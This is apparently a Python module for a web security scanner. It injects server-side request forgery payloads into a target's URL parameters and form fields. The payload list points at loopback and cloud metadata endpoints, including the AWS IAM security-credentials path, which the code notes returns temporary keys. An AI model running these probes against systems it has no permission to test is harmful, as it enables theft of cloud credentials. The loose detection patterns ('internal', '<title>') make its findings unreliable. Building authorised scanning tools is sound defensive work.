from __future__ import annotations

import re

import requests
from bs4 import BeautifulSoup

from .base import BaseScanModule, Finding

# SSRF payloads -- internal targets (CBBH 12: Server-side Attacks -- SSRF)
SSRF_PAYLOADS = [
    ("http://127.0.0.1/", "localhost loopback"),
    ("http://localhost/", "localhost hostname"),
    ("http://0.0.0.0/", "null route"),
    ("http://169.254.169.254/latest/meta-data/", "AWS cloud metadata"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials"),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
    ("http://169.254.169.254/metadata/v1/", "Azure metadata"),
]

# URL parameters that commonly accept URLs (SSRF injection points)
SSRF_PARAMS = [
    "url", "path", "src", "href", "redirect", "next", "target",
    "dest", "destination", "link", "uri", "proxy", "fetch", "load",
    "resource", "file", "page", "image", "img", "request",
]

# Indicators that an SSRF probe returned internal content
SSRF_SUCCESS_PATTERNS = [
    r"ami-id",                  # AWS metadata
    r"instance-id",
    r"security-credentials",
    r"computeMetadata",         # GCP
    r"nginx",                   # Internal service
    r"apache",
    r"127\.0\.0\.1",
    r"localhost",
    r"internal",
    r"<title>",                 # Any HTML from internal service
]


class SSRFScanner(BaseScanModule):
    name = "ssrf"
    description = "Inject SSRF payloads into URL parameters and form fields to probe internal services"

    def run(self, url: str) -> list[Finding]:
        findings: list[Finding] = []

        # Step 1: Check URL query parameters
        from urllib.parse import parse_qs, urlparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        ssrf_params = {k: v for k, v in params.items() if k.lower() in SSRF_PARAMS}

        # Step 2: Check for SSRF-prone params in forms
        form_ssrf_fields = self._find_ssrf_form_fields(url)

        if not ssrf_params and not form_ssrf_fields:
            findings.append(Finding(
                check="SSRF",
                result="INFO",
                severity="Info",
                evidence=f"No SSRF-prone parameters detected in URL or forms at {url}",
                detail=(
                    "SSRF-prone params: url, path, src, href, redirect, next, target, dest, proxy, fetch. "
                    "Check API endpoints that fetch remote resources."
                ),
            ))
            return findings

        # Test URL params
        for param in ssrf_params:
            result = self._test_url_param(url, parsed, params, param)
            if result:
                findings.append(result)

        # Test form fields
        for field_info in form_ssrf_fields:
            result = self._test_form_field(field_info)
            if result:
                findings.append(result)

        if not any(f.result == "VULNERABLE" for f in findings):
            findings.append(Finding(
                check="SSRF",
                result="SECURE",
                severity="Info",
                evidence="SSRF payloads did not produce internal content in responses.",
            ))

        return findings

    def _find_ssrf_form_fields(self, url: str) -> list[dict]:
        fields = []
        try:
            resp = requests.get(url, timeout=self.timeout, verify=False)
            soup = BeautifulSoup(resp.text, "html.parser")
            for form in soup.find_all("form"):
                action = form.get("action", url)
                base = url.rstrip("/")
                full_action = action if action.startswith("http") else base + "/" + action.lstrip("/")
                for inp in form.find_all("input"):
                    name = inp.get("name", "")
                    if name.lower() in SSRF_PARAMS:
                        fields.append({
                            "action": full_action,
                            "method": form.get("method", "post").lower(),
                            "field": name,
                        })
        except requests.RequestException:
            pass
        return fields

    def _test_url_param(self, url, parsed, params, param) -> Finding | None:
        from urllib.parse import urlencode, urlunparse
        for payload_url, target_desc in SSRF_PAYLOADS:
            new_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            new_params[param] = payload_url
            test_url = urlunparse(parsed._replace(query=urlencode(new_params)))
            result = self._probe(test_url, param, payload_url, target_desc, f"GET {test_url}")
            if result:
                return result
        return None

    def _test_form_field(self, field_info: dict) -> Finding | None:
        for payload_url, target_desc in SSRF_PAYLOADS:
            data = {field_info["field"]: payload_url}
            try:
                if field_info["method"] == "get":
                    resp = requests.get(field_info["action"], params=data,
                                        timeout=self.timeout, verify=False)
                else:
                    resp = requests.post(field_info["action"], data=data,
                                         timeout=self.timeout, verify=False)
                finding = self._check_response(
                    resp, field_info["field"], payload_url, target_desc,
                    f"{field_info['method'].upper()} {field_info['action']}"
                )
                if finding:
                    return finding
            except requests.RequestException:
                continue
        return None

    def _probe(self, test_url, param, payload_url, target_desc, raw_request) -> Finding | None:
        try:
            resp = requests.get(test_url, timeout=self.timeout, verify=False,
                                allow_redirects=True)
            return self._check_response(resp, param, payload_url, target_desc, raw_request)
        except requests.RequestException:
            return None

    def _check_response(self, resp, param, payload_url, target_desc, raw_request) -> Finding | None:
        for pattern in SSRF_SUCCESS_PATTERNS:
            if re.search(pattern, resp.text, re.IGNORECASE):
                return Finding(
                    check="SSRF (Server-Side Request Forgery)",
                    result="VULNERABLE",
                    severity="Critical",
                    evidence=f"Parameter '{param}' with payload '{payload_url}' ({target_desc}) "
                             f"returned internal content.",
                    detail=(
                        "SSRF confirmed. Attacker can probe internal services (databases, admin panels, "
                        "cloud metadata APIs for IAM credentials). "
                        "On AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/ "
                        "returns temporary AWS keys. "
                        "Fix (CBBH): validate and whitelist allowed URL schemes and domains; "
                        "block requests to private IP ranges (127.x, 10.x, 172.16-31.x, 192.168.x); "
                        "use a DNS rebinding-resistant allowlist; "
                        "disable unnecessary URL-fetching functionality."
                    ),
                    raw_request=raw_request,
                    raw_response=resp.text[:400],
                )
        return None
